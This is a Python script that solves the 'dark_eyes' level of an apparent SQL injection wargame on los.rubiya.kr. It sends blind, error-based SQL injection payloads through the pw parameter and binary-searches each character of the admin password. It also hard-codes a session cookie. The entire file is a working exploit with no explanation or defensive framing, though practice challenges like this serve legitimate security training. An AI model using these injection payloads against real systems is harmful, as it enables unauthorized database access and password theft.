import requests

url='http://los.rubiya.kr/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php'
hdr={'Cookie' : 'PHPSESSID=e46srtpmi91qolstld3fbr4dn2'}




def equal(i,num):
    data="?pw=' or id='admin' and (select 1 union select (ord(substr(pw,"+str(i)+",1))) = "+str(num)+")%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("select id from prob_dark_eyes where id='admin' and pw=''") != -1:
        return True
    else :
        return False


def higher(i,num):
    data="?pw=' or id='admin' and (select 1 union select (ord(substr(pw,"+str(i)+",1))) < "+str(num)+")%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("select id from prob_dark_eyes where id='admin' and pw=''") != -1:
        return True
    else :
        return False

def lower(i,num):
    data="?pw=' or id='admin' and (select 1 union select (ord(substr(pw,"+str(i)+",1))) > "+str(num)+")%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("select id from prob_dark_eyes where id='admin' and pw=''") != -1:
        return True
    else :
        return False

def PW(i,low,high):
    if low > high:
        return False
    else :
        mid = (low+high) // 2

        if equal(i,mid):
            return str(mid)
        elif higher(i,mid):
            high = mid - 1
        elif lower(i,mid):
            low = mid + 1


        return PW(i,low,high)

answer=[]
answer_2=''

for i in range(1,9):
    answer.append(str(PW(i,0,55203)))

    print("패스워드 찾는 중..........{}".format(str(PW(i,0,55203))))
print(answer)

for j in range(len(answer)):
    answer_2 += chr(int(answer[j]))
    print("패스 워드 : "+chr(int(answer[j]))+"")


print(answer_2)
